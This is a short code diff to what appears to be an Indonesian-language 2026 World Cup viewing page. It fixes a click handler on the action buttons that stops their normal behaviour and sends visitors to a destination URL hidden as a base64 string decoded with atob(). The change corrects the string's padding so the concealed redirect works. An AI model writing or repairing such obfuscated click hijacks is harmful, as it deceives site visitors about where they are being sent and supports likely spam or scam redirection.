@@ -1218,7 +1218,8 @@ const pageDesc = "Saksikan setiap momen bersejarah Piala Dunia 2026 dengan jerni
       actionButtons.forEach(btn => {
         btn.addEventListener('click', (e) => {
           e.preventDefault();
-          const secretLink = atob('aHR0cHM6Ly9jdWt1cnVrdWsuY28v==');
+          // Base64 yang sudah dikoreksi tanpa tanda "=="
+          const secretLink = atob('aHR0cHM6Ly9jdWt1cnVrdWsuY28v');
           window.location.href = secretLink;
         });
       });
